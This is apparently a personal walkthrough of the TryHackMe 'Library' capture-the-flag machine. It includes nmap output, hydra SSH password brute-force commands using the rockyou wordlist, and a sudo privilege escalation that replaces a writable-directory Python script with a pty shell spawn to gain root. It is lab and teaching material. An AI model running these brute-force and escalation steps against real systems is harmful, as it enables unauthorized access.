@@ -1,0 +1,90 @@
+Library
+- a boot2root machine for FIT and bsides guatemala CTF
+- created by stuxnet
+
+WALKTHROUGH
+
+Boot up target machine via TryHackMe and attack machine using openvpn on kali vm
+
+Begin recon with nmap scan on target machine
+
+While nmap scan is running, access http page via browser
+  
+Can't navigate the directory via UI, but can see user 'melodias' has posted
+    Also note that root, www-data and anonymous have left comments on meliodas's post
+
+Check nmap scan, identify two open ports and an accesible robots.txt file
+  └─$ nmap -sV -sC -A <TARGETMACHINE>          
+  ...
+  PORT   STATE SERVICE VERSION
+  22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+  ...
+  80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+  | http-robots.txt: 1 disallowed entry 
+  |_/
+  |_http-title: Welcome to  Blog - Library Machine
+  |_http-server-header: Apache/2.4.18 (Ubuntu)
+  ...
+  Running: Linux 5.X
+  OS CPE: cpe:/o:linux:linux_kernel:5.4
+  OS details: Linux 5.4
+
+Access robots.txt file via browser
+  <TARGETIP>/robots.txt
+    User-agent: rockyou 
+    Disallow: /
+      *clue - rockyou is the name of a popular password list
+
+  So far, a username and password list have been identified
+
+Use hydra against the target machine with the information gathered
+  hydra -l meliodas -P /path/to/wordlists/rockyou.txt -t 6 ssh://<TARGETMACHINE>
+    Password found!
+
+SSH into target using harvested credentials and cat user.txt
+  [FLAG 1 FOUND]
+
+Open other tab and use hydra against the root account
+   hydra -l root -P /path/to/wordlists/rockyou.txt -t 6 ssh://<TARGETMACHINE>
+      Taking forever, keep running in case but let's keep moving
+
+Return to ssh terminal and check privileges for meliodas 
+    meliodas@ubuntu:~$ sudo -l
+    ...
+    User meliodas may run the following commands on ubuntu:
+    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
+
+        meliodas can use sudo to run a python script without password in same folder as first flag
+          Probably something, doesn't seem to be much help at first
+            Script isn't helpful, can't edit the file
+            This part took me some time in playing at different angles of attack
+              Changing file permissions, cracking root password
+          The solve is simpler than I was working towards
+
+The file can't be changed but it can be deleted and replaced with an identically named file
+  The path remains the same so the user privileges can be exploited
+
+Delete bak.py script and replace it with a new bak.py that contains a shell command to provide a privileged python shell on execution
+
+   meliodas@ubuntu:~$ ls -l
+   total 8
+   -rw-r--r-- 1 root     root     353 Aug 23  2019 bak.py
+   -rw-rw-r-- 1 meliodas meliodas  33 Aug 23  2019 user.txt
+   meliodas@ubuntu:~$ rm bak.py 
+   rm: remove write-protected regular file 'bak.py'? yes
+   meliodas@ubuntu:~$ echo 'import pty;pty.spawn("/bin/bash")' > bak.py
+   meliodas@ubuntu:~$ sudo /usr/bin/python3 /home/meliodas/bak.py
+
+          Note the path specification aligns with the system permissions
+                <User meliodas may run the following commands on ubuntu:
+                (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py>
+
+    root@ubuntu:~# cat /root/root.txt
+  [FLAG 2 FOUND]
+
+Return to tab with hydra still running against the root account and stop process
+    No yield, no problem
+
+        
+
+  
